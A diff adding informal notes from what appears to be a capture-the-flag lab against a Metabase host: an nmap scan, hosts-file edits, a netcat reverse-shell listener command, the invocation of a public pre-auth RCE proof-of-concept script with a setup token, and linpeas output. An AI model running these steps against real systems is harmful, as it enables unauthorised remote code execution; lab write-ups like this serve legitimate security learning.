@@ -1,0 +1,43 @@
+nmap 10.10.11.233 -T4                                                                                     130 ⨯
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 17:42 EST
+Nmap scan report for 10.10.11.233
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
+
+added ip to /etc/hosts
+
+managed to get in to webpage
+
+When trying to enter data.analytical.htb/ it gives me Unknown host error
+
+added data.analytical.htb ti /etc/hosts and succed to enter 
+
+Metabase login page opened up 
+
+after google search found RCE script https://github.com/m3m0o/metabase-pre-auth-rce-poc?search=1 
+
+after looking in github page found instruction how to use this script
+
+downloaded rlwrap to use script and opened netcat with this application using command sudo rlwrap nc lnvp 4444
+
+and used the script using the instruction command python3 main.py -u http://[targeturl] -t [setup-token] -p "[command]"
+
+my setup token 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+
+succed to get in
+
+inside tmp folder found linpeas.show
+
+╔══════════╣ Useful software
+/bin/base64                                                                                                         
+/usr/bin/curl
+/usr/bin/nc
+/bin/ping
+/usr/bin/wget
+
+
